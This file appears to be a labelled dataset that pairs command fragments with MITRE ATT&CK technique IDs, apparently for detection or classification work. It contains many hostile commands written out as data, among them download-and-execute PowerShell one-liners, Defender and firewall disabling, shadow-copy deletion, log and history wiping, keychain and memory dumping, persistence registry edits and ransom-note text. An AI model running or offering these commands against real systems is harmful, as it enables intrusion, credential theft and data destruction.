command,mitre_id
Stop-Process -processname notepad,T1055
"echo ""ExecStopPost=$execstoppost_action"" >> $systemd_service_path/$systemd_service_file",T1543
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\\[a-f0-9A-F]{8},T1547
"echo ""2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. [f you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them — in this case we won't be able to help. "" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
try{,T1070
SIGQUIT,T1564
echo $(echo $ENCODED) | b64decode -r,T1140
"net groups ""Account Operators"" /domain",T1069
/HMODULE,T1218
winword.exe {REMOTEURL},T1105
bash /tmp/art_payload.sh,T1027
.timer,T1053
ObtainUserAgentString,T1106
"if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT""; fi",T1562
"""@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat",T1558
LogonUser,T1134
"Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-ApplicationGuard"" -NoRestart -ErrorAction Ignore",T1562
PIS-MOB,T1070
property * | findstr “Address””,T1018
~/Library/Keychains/login.keychain,T1555
"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""",T1218
echo save backup copy to /tmp/,T1547
replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A,T1105
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe,T1219
"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:""$output_file"" /target:exe ""$source_file""",T1106
recentFiles.py,T1083
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Asynchronous"" 0 -Type DWord -Force",T1547
.wsb,T1564
hidden,T1564
C:\Windows\System32\cmd.exe,T1059
"if (""$uname"" -ne """") {",T1204
ProxyCommand,T1202
netsh.exe advfirewall firewall show rule name=all,T1518
"reg query ""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""",T1012
"New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel""",T1562
"python3 -c ""from base64 import b64decode as d;dec=d(\""$ENCODED\"");print(dec.decode())""",T1140
net use * /DELETE /Y,T1070
mstsc.exe,T1021
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop},T1003
wmic cpu get name,T1082
Invoke-watson,T1082
$word.Quit(),T1137
AddMonitor,T1547
"schtasks /create /tn ""mysc"" /tr C:\Users\Public\test.exe /sc ONLOGON /ru ""System""",T1053
"Start-Process ""$file_path\Sysinternals\accesschk.exe"" -ArgumentList ""-accepteula .""",T1555
netstat -oan,T1049
"if($cred.GetNetworkCredential().Password -eq ""$new_password""){",T1098
copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf,T1216
echo $sh_encoded | base64 -d | bash,T1140
"copy ""$filename"" %TEMP%\LibHello.js",T1127
SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat},T1218
C:\\,T1036
upload,T1140
"Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch\"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" -Name)[0])",T1070
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine"" -Name ""MpEnablePus"" -Value 0",T1562
try {,T1046
"""@ -Replace ""kirbifile"", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat",T1558
InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.,T1218
attrib.exe +s $file_to_modify,T1564
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 5",T1559
Start-Process -FilePath $env:windir\system32\sdclt.exe,T1548
Set-ADUser -AllowReversiblePasswordEncryption $true,T1556
ZwOpenProcess,T1562
bing[.]com?id=<GetTickCount>,T1016
public class Test {,T1036
pw useradd $username -g 0 -d /root -s /bin/sh,T1136
"$tr.Add(""[File] $_ Size:$($fi.Length) LastWrite:$($fi.LastWriteTime)"")",T1083
rd /S,T1070
"mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -R ""$file"" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*",T1070
StorageAccountName = $account.name,T1619
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum,T1082
"dd if=/proc/""${PID}""/mem of=""$output_file"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""",T1003
sqlcmd -i $remote_url -o $local_file_path,T1105
"reg add ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v AutoAdminLogon /t REG_DWORD /d 1 /f",T1562
1..$limit | % {,T1003
"echo ""# Default-Stop: "" >> /etc/init.d/T1543.002",T1543
"echo ""$pwd_for_encrypted_file"" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo $encryption_alg -o $encrypted_file_path -c $input_file_path",T1486
"copy ""$ps1_path"" %temp%\T1036.007_masquerading.doc.ps1 /Y",T1036
kernel32.dll,T1497
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v https /t REG_DWORD /d 0 /F",T1112
"rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}",T1218
Add-MpPreference -ExclusionProcess $excludedProcess,T1562
gcloud iam service-accounts keys create $output-key-file --iam-account=$service-account-email,T1078
gsettings,T1564
"Copy-Item -Path ""C:\windows\system32\customshellhost.exe"" -Destination ""$dest_path\customshellhost.exe"" -Force",T1218
"echo ""Whatever who you are and what your title is if you' re reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. Moreover, we have taken a great amount of your corporate data prior to encryption Well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. We're fully aware of what damage we caused by locking your internal sources. At the moment. you have to know: "" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load,T1547
ADMIN$,T1021
C:\\windows\\temp\\s\\,T1074
Invoke-RunAs,T1134
LoadResource,T1106
ThreadHideFromDebugger,T1622
"""reg"" add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f",T1562
regsvcs.exe {PATH:.dll},T1218
pnputil.exe -i -a $driver_path,T1547
CreateProcessW,T1106
"Start-Process -FilePath ""C:\Temp\ExternalPayloads\PCHunter_free\$pchunter64_exe""",T1057
esxi network ip connection list,T1049
/var/spool/cron/crontabs/root,T1053
"Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Notification Packages"" $notificationPackagesValues",T1556
mkdir $HOME/...,T1036
dd if=/dev/urandom bs=1 count=1 >> $file_to_pad #adds low-quality random data,T1027
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices,T1060
ru_RU,T1614
HKEY_CURRENT_USER\Software\Classes\CLSID\{E6D34FFC-AD32-4d6a-934C-D387FA873A19},T1546
%USERPROFILE%\AppData\Local\Google\Chrome\User Data\LocalState,T1217
echo End of Golden Ticket attack,T1558
"rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}",T1218
"wmic.exe /node:""192.168.0.1"" process call create ""{CMD}""",T1218
"echo ""put $local_path\$file_name"" | sftp $username@$remote_host:$remote_path",T1105
certutil -decode {PATH:.base64} {PATH},T1140
esxcli system syslog config reload,T1562
"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v ""DelegateExecute"" /f",T1548
Volume Information,T1485
copy C:\Windows\System32\cmd.exe C:\lsm.exe,T1036
Service1,T1543
sysctl -w kernel.randomize_va_space=0,T1562
SEKURLSA::Pth,T1550
"az ad user list --filter ""displayname eq 'atomicredteam'""",T1136
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"" /v ""DisableEnhancedNotifications"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
sudo ee /usr/local/etc/sudoers,T1548
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId,T1098
"echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"""" | sudo tee -a /etc/rc.common",T1037
echo '$text_to_append' >> /etc/profile,T1546
CLSID_ShellLink,T1559
Invoke-Command,T1059
Manufacturer,T1497
HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows,T1060
Get-DataInfo.ps1,T1518
Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe,T1127
"& ""PathToAtomicsFolder\T1027.006\bin\T1027_006_remote.html""",T1027
LDAP://,T1216
mkdir $file_or_folder >nul 2>&1,T1222
bcd.bat,T1059
Add-MpPreference -ExclusionPath $excludedpath,T1562
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""{PATH_ABSOLUTE:.bat}""",T1218
certutil.exe -p $password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 $output,T1552
DllName,T1547
dscl -create,T1136
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRealtimeMonitoring"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
NtQueryInformationProcess,T1106
Get-WebServicesVirtualDirectory,T1083
sleep -s 60,T1090
HKLM\Software\NFC\,T1012
cmd.exe /C quser,T1033
} while ($false) # dummy loop so that 'break' can be used,T1558
Invoke-Expression,T1059
/dev/shm,T1027
0x7A,T1140
wget http://103.224.80[.]44:8080/kernel,T1071
libprocesshider,T1049
C:\Program Files (x86)\Microsoft Office\root\Office16\,T1137
"echo """" | ""$plink_file"" ""$vm_host"" -ssh -l ""$vm_user"" -pw ""$vm_pass"" -m ""$cli_script""",T1082
cat /etc/pam.d/system-auth,T1201
if ([string]::IsNullOrWhiteSpace($fileContent)) {,T1560
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices,T1012
xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_-,T1027
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""",T1547
nltest.exe,T1482
"Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\InjectView.exe""",T1055
wmic shadowcopy delete,T1490
Office365DCOMCheck.ps1,T1036
then sed -i '$ a #art_test_1562_006_2' /etc/$syslog_config_file_name,T1562
mountvol.exe,T1222
if [ -f /etc/issue ]; then cat /etc/issue >> $output_file; fi,T1082
Microsoft.RecoveryServices/Vaults/backupFabrics/protectionContainers/delete,T1490
extrac32 $path\procexp.cab $path\file.txt:procexp.exe,T1564
docker exec t1046_container /scan.sh,T1046
cat /etc/passwd |grep ^art,T1059
crontab -l > /tmp/notevil,T1053
echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt,T1486
"Get-NetFirewallRule | select DisplayName, Enabled, Description",T1518
/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist file,T1046
sudo $program_path -4 -P -p 17 -t 3,T1040
show ip sockets,T1049
"New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force",T1548
regasm.exe /U {PATH:.dll},T1218
Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden,T1564
REG ADD HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /t REG_DWORD /d 0,T1562
"openssl req -x509 -new -nodes -key $key_filename -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out $cert_filename",T1553
try { $myT1036_003 = (Start-Process -PassThru -FilePath $outputfile).Id },T1036
"powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath ""/../../../../../; {PATH:.exe} ;""",T1216
%Startup%\mssync.exe,T1547
"if(-not $wdApp.path.contains(""Program Files (x86)""))",T1137
"echo ""Hello World!""",T1056
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe,T1546
echo $HISTFILESIZE,T1562
Get-ChildItem $AppData -Recurse -Force | ForEach-Object {,T1560
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore,T1562
"$sheet.Cells.Item(22,1) = ""=EXEC(`""explorer.exe C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A2&`""`"")""",T1204
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f",T1547
/etc/paths.d,T1574
GetKeyboardState,T1056
"echo ""\npython3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"""" | sudo tee -a /etc/rc.local",T1037
"wevtutil sl ""$log_name"" /e:false",T1562
rmdir /s /q $folder_to_delete,T1070
InventoryManager.bk,T1070
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Reporting"" -Name ""DisableEnhancedNotifications"" -Value 1",T1562
C:\Windows\System32\utilman.exe,T1546
sysctl hw.model,T1497
dxcap.exe -usage,T1127
rm -rf ~/Library/Mail/copy/*,T1070
C:\Windows\System32\winevt\Logs,T1070
Out-EncryptedScript.ps1,T1027
"icacls ""$path"" /grant Everyone:F /T /C /Q",T1222
/var/log/wtmp,T1070
cmd.exe /c ping %userdomain%,T1016
/maps,T1003
CreatePipe,T1559
ExecStart,T1543
nohup /bin/support &,T1564
"powershell.exe /c ""Get-Service | where-object {$_.DisplayName -like '*sysm*'}""",T1518
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f",T1112
GetExtendedTcpTable,T1049
"Invoke-WebRequest -OutFile $env:Temp\test10.lnk ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk""",T1204
New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username,T1136
NTDLL.dll,T1129
3jB(2bsG#@c7,T1027
/usr/sbin/setenforce,T1083
xxd,T1027
"Compress-Archive -Path ""$input_file"" -DestinationPath $output_file -Force",T1074
svchost.exe -k netsvcs,T1055
"New-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultPassword -Value password1 -Force",T1562
public int Attributes;,T1562
mmc.exe gpedit.msc,T1218
./stratus warmup aws.defense-evasion.cloudtrail-event-selectors,T1562
sudo echo '' > $system_log_path,T1070
tdbdump,T1003
Invoke-AllChecks,T1059
"Set-LocalUser -Name $account -Description ""atr:$account;$originalDescription"".Substring(0,48) # Keep original name in description",T1098
powershell.exe -ep bypass -file c:\path\to\a\script.ps1,T1059
$fileExtensions -contains $_.Extension.ToLower(),T1005
.avos,T1486
Nwsapagent,T1543
InfDefaultInstall.exe {PATH:.inf},T1218
cat $output_file 2>/dev/null,T1082
RBCD-Check -consoleoutput -noninteractive,T1082
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose,T1033
"cmd /c ""$ps_exec_location"" -accepteula -i -s cmd.exe /c logman update trace ""$session"" --p ""$provider"" -ets",T1562
"echo 'malicious_command = ""$executor $payload_file_name $script_args""' >> $python_script_name",T1059
$User.DisplayName = $SamAccountName,T1136
"echo ""starting warmup""",T1552
"Get-ChildItem -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\"" | findstr Windows",T1012
"Start-Hollow -Sponsor ""$sponsor_binary_path"" -Hollow ""$hollow_binary_path"" -ParentPID $ppid -Verbose",T1055
cd $hashcat_exe\..,T1110
"reg add ""HKLM\software\microsoft\windows defender\spynet"" /v ""SubmitSamplesConsent"" /t REG_DWORD /d ""0"" /f >NUL 2>nul",T1562
ExecStopPost,T1543
"if (""$auth"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",T1110
"""C:\Program Files\Oracle\VirtualBox\VBoxSVC.exe"" /reregserver",T1564
GetExtendedUdpTable,T1049
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary',T1105
mkdir %APPDATA%\Microsoft\Outlook\ >nul 2>&1,T1137
PIS-DB,T1070
"if((($Manufacturer.ToLower() -eq ""microsoft corporation"") -and ($Model.ToLower().contains(""virtual""))) -or ($Manufacturer.ToLower().contains(""vmware"")) -or ($Model.ToLower() -eq ""virtualbox"")) {write-host ""Virtualization environment detected!""} else {write-host ""No virtualization environment detected!""}",T1497
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=organizationalUnit) $optional_args",T1482
dns-sd -B _ssh._tcp .,T1046
if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi,T1082
no logging,T1562
chmod +x /etc/init.d/T1543.002,T1543
pastebin[.]com,T1567
CGEventTap,T1056
sqldumper.exe 540 0 0x01100:40,T1003
__tutma,T1071
ln -sf /dev/null $history_path,T1070
sudo dd if=/dev/zero bs=1000 count=5 of=$system_log_path #log file filled with null bytes(zeros),T1070
"echo ""# Required-Start: \$all"" >> /etc/init.d/T1543.002",T1543
.text,T1055
runas,T1134
~/Library/Keychains/,T1555
IARPUinstallerStringLauncher,T1559
"quser /SERVER:""$computer_name""",T1033
HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32,T1546
systemctl restart auditd,T1056
Get-Process,T1057
nltest.exe /domain_trusts,T1482
cp $payload /tmp/hello.c,T1548
osascript -e,T1059
sudo cp $path_malicious_script /Library/StartupItems/atomic.sh,T1037
IShellLink,T1559
"Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=""Remote Desktop - Shadow (TCP-In)""' -CimSession $s | Invoke-CimMethod -MethodName Enable",T1112
"Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""$target_key_value_name"" -Value ""$payload""",T1547
chmod -R $symbolic_mode $file_or_folder,T1222
HeapAlloc,T1106
REG ADD HKCU\Environment /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f,T1562
C:\Windows\System32\DisplaySwitch.exe,T1546
"echo ""Hi friends"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoDesktop /t REG_DWORD /d 1 /f",T1112
"Write-Host ""End of Hijacking""",T1098
"echo ""# THIS IS A COMMENT"" >> /etc/ufw/user.rules",T1562
HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap,T1112
hha.dll,T1036
"Invoke-WebRequest -Uri ""https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe"" -OutFile $env:Temp\KeyScrambler_Setup.exe",T1574
"find / -path ""*/Firefox/Profiles/*/places.sqlite"" -exec echo {} >> $output_file \;",T1217
rd /s /q %systemdrive%\$RECYCLE.BIN,T1070
if (Test-Path $credFile) {,T1098
ATBroker.exe /start malware,T1218
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures,T1490
"Write-Host "" [-] Attempting ${password} on account ${user}.""",T1110
"New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER"" -PropertyType String -Value ""$clsid_guid"" -Force | Out-Null",T1574
Invoke-SessionGopher,T1552
"Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value ""T1086 PowerShell Session Creation and Use""",T1059
@reboot,T1053
LVM_SORTITEMS,T1055
C:\Users\Public\Documentsfiles,T1070
code tunnel,T1219
"if (-not (Test-Path ""$file_to_delete"")) { New-Item ""$file_to_delete"" -Force }",T1485
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12,T1003
"osascript -e 'tell application ""Finder""' -e 'set destinationFolderPath to POSIX file ""$destination_path""' -e 'set notesFolderPath to (path to home folder as text) & ""Library:Group Containers:group.com.apple.notes:""' -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file ""NoteStore.sqlite"", file ""NoteStore.sqlite-shm"", file ""NoteStore.sqlite-wal""} of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'",T1005
winlogon.exe,T1531
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAHealth /t REG_DWORD /d 1 /f",T1112
import -window root $output_file,T1113
truncate -s 0 /var/log/messages #size parameter shorthand,T1070
New-Item -Path $registryPath -Force,T1546
CreateProcessWithLoginW,T1546
code.exe,T1105
"if [ -f ""/etc/syslog-ng/$syslog_ng_config_file_name"" ];",T1562
"Import-Module ""$ps_module""",T1048
"copy $input_binary ""%SystemRoot%\System32\evilscreensaver.scr""",T1546
"Write-Host ""OneDriveStandaloneUpdater.exe not found at $onedrive_path. Test cannot continue.""",T1105
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Logon"" ""$function_to_execute"" -Force",T1547
if (-Not $domain.IsVerified) {,T1484
popen,T1574
"Start-Process -FilePath ""C:\Windows\System32\RUNDLL32.EXE"" -ArgumentList '-localserver $clsid'",T1546
echo ' ' >> $rc_service_path/$rc_service_file,T1543
Write-Host $new,T1484
az ad user delete --id $userprincipalname,T1531
SecKeychainFindInternetPassword,T1555
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UIF2IS20VK,T1547
scp.exe $username@$remote_host:$remote_path $local_path,T1105
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Startup"" -Value ""$new_startup_folder""",T1547
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""ODSUUpdateXMLUrlFromOC"" -Value ""$remote_url"" -Type String -Force",T1105
ssh_zcp,T1555
netsh.exe advfirewall show allprofiles,T1518
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender"" -Name ""DisableAntiVirus"" -Value 1",T1562
New-Item $rclone_config_path\rclone\rclone.conf,T1567
jsc.exe /t:library {PATH:.js},T1127
App_Web_,T1036
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM,T1003
c:\ProgramData\found_shares.txt,T1074
findstr /si pass *.xml *.doc *.txt *.xls,T1552
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1'),T1136
az ad user get-member-groups,T1069
pr,T1046
"sudo rm $journal_folder/* #physically deletes the journal files, and not just their content",T1070
export $proxy_scheme_proxy=$proxy_server:$proxy_port,T1090
"schtasks /Create /TN ""$task_name"" /TR ""eventvwr.msc"" /SC ONLOGON /RL HIGHEST /F",T1053
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f,T1548
GetAccountPasswordPolicy,T1201
netstat -nao,T1049
"Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" ""StubPath"" ""$payload"" -Force",T1547
/proc/<PID>/cmdline,T1036
Get-ProcessTokenPrivilege,T1057
/etc/passwd,T1556
SharpCloud -consoleoutput -noninteractive,T1552
"$sheet.Cells.Item(8,1) = ""=FWRITELN(A5, `""Set winHttp = CreateObject(`""`""WinHTTP.WinHTTPrequest.5.1`""`"")`"")""",T1204
net group,T1098
HKLM\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\NullSessionPipes,T1112
net localgroup Administrators,T1069
FailureCommand,T1574
"Write-Output ""File created: $filePath""",T1105
launchctl load,T1569
reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /f >nul 2>&1,T1112
show tcp brief,T1049
/altvba,T1137
oldchecks -noninteractive -consoleoutput,T1082
"echo $ENCODED > $encoded_file && python3 -c ""import base64;dec=base64.b64decode(open('$encoded_file').read());print(dec.decode())""",T1140
"Copy-Item -Path ""C:\windows\system32\calc.exe"" -Destination ""$dest_path\explorer.exe"" -Force",T1218
EverNoteTrayUService,T1547
conhost.exe --headless calc.exe,T1564
foreach ($ip in $subnetIPs) {,T1046
New-Item -Path $dest_path -ItemType Directory,T1218
"if [ -f ""/etc/$auditd_config_file_name"" ];",T1562
ipconfig /all >> %temp%\download,T1016
Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword,T1098
cron,T1053
GetFileAttributesW,T1083
nltest,T1016
"rundll32.exe ""$input_file"",#2",T1218
monitor capture,T1040
SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers,T1112
"New-Item -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Value '$command_to_execute'",T1548
credwiz.exe,T1574
HKLM\SOFTWARE\Microsoft\CurrentVersion\Run,T1547
eventvwr.exe,T1548
"cscript ""$vbscript"" > $env:TEMP\T1059.005.out.txt",T1059
HKEY_LOCAL_MACHINE\SOFTWARE\DDE\tpid,T1112
if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue },T1562
mshta.exe,T1218
cat /dev/null > $history_path,T1070
cd /tmp/atomic-test-T1036.006,T1036
echo Tickets after requesting SYSVOL:,T1558
DeviceInfo.,T1680
ls -la /Applications,T1082
Sqlps.exe -noprofile,T1218
sc.exe sdset scmanager D:(A;;KA;;;WD),T1569
/tmp/,T1564
RegWrite,T1559
grep vmw /proc/modules,T1082
"ls /etc | egrep -e""fedora\*|debian\*|gentoo\*|mandriva\*|mandrake\*|meego\*|redhat\*|lsb-\*|sun-\*|SUSE\*|release""",T1082
icacls /reset,T1222
qawsed1q2w3e,T1140
net user username \password \domain,T1136
"launchctl load -w ""%s/Library/LaunchAgents/%s""",T1569
"echo ""[*] Listing runlevel directories (/etc/rc*.d):""",T1007
"cmd /c ""$env:userprofile\Downloads\T1036\README.cmd"" >$null 2>$null",T1036
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 3",T1559
sudo nmap -sS $network_range -p $port,T1046
pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java,T1202
.msi,T1546
show ssh,T1033
echo $0,T1059
sudo security dump-keychain -d login.keychain,T1555
"$item.Document.Application.ShellExecute(""cmd.exe"",""/c calc.exe"",""C:\windows\system32"",$null,0)",T1546
$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThreadNative.exe -pid $process.Id -debug,T1055
"try { [System.IO.File]::Copy(""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\$target_hive"" , ""$env:TEMP\$target_hivevss$_"", ""true"") } catch {}",T1003
%Program Data%\\Microsoft\\,T1574
/usr/lib/systemd/system/,T1036
dir /s c:\ >> $output_file,T1083
%SystemRoot%\System32\,T1505
"$sheet.Cells.Item(19,1) = ""=FCLOSE(A5)""",T1204
/var/log/syslog,T1070
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f",T1562
%temp%\tcm.tmp -encode $executable %temp%\T1140_calc2.txt,T1140
set comspec=$command_to_execute,T1216
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce,T1060
"powershell.exe -ep bypass -command ""set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()""",T1216
HKCU\Software\Microsoft\Windows\CurrentVersion\Run,T1547
Start-Sleep 10,T1539
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""",T1137
if (-not (Test-Path -Path $storageAccountOutputPath)) {,T1530
%HiddenReg%,T1564
Get-AzurePasswords -subscription '$subscription_id' > $output_file,T1555
C:\unsafe path with space\program.exe,T1574
"if ($row.FileShareName -ne """"){",T1530
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id,T1114
Accept-Language,T1614
